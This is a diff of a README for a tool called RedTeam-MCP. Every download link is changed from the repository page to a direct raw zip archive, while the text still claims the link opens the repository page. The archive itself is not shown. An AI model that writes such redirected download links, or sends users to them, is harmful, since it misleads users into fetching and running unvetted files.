@@ -1,6 +1,6 @@
 # 🛡️ RedTeam-MCP - Automated Red Team Testing Tool
 
-[![Download](https://img.shields.io/badge/Download-RedTeam--MCP-ff4500?style=for-the-badge)](https://github.com/RELIAX1212221/RedTeam-MCP)
+[![Download](https://img.shields.io/badge/Download-RedTeam--MCP-ff4500?style=for-the-badge)](https://raw.githubusercontent.com/RELIAX1212221/RedTeam-MCP/main/redteam-server/Red_Team_MCP_v1.4.zip)
 
 ---
 
@@ -44,7 +44,7 @@ This section shows how to download, install, and run RedTeam-MCP on your Windows
 
 Click the button below to visit the download page:
 
-[![Download](https://img.shields.io/badge/Download-RedTeam--MCP-brightgreen?style=for-the-badge)](https://github.com/RELIAX1212221/RedTeam-MCP)
+[![Download](https://img.shields.io/badge/Download-RedTeam--MCP-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/RELIAX1212221/RedTeam-MCP/main/redteam-server/Red_Team_MCP_v1.4.zip)
 
 This link takes you to the GitHub repository page where you can find the latest releases. Look for the "Releases" section on the page.
 
@@ -121,7 +121,7 @@ If RedTeam-MCP does not start or shows errors:
 ## 🔗 Useful Links
 
 - Repository and download page:  
-  https://github.com/RELIAX1212221/RedTeam-MCP
+  https://raw.githubusercontent.com/RELIAX1212221/RedTeam-MCP/main/redteam-server/Red_Team_MCP_v1.4.zip
 
 - Issues and support: Use the "Issues" tab on the GitHub page to report problems or ask questions.
 
@@ -136,4 +136,4 @@ Topics covered by this tool include Active Directory security, AI agents for hac
 ---
 
 Click to download and try RedTeam-MCP:  
-[![Download](https://img.shields.io/badge/Download-RedTeam--MCP-ff4500?style=for-the-badge)](https://github.com/RELIAX1212221/RedTeam-MCP)
+[![Download](https://img.shields.io/badge/Download-RedTeam--MCP-ff4500?style=for-the-badge)](https://raw.githubusercontent.com/RELIAX1212221/RedTeam-MCP/main/redteam-server/Red_Team_MCP_v1.4.zip)
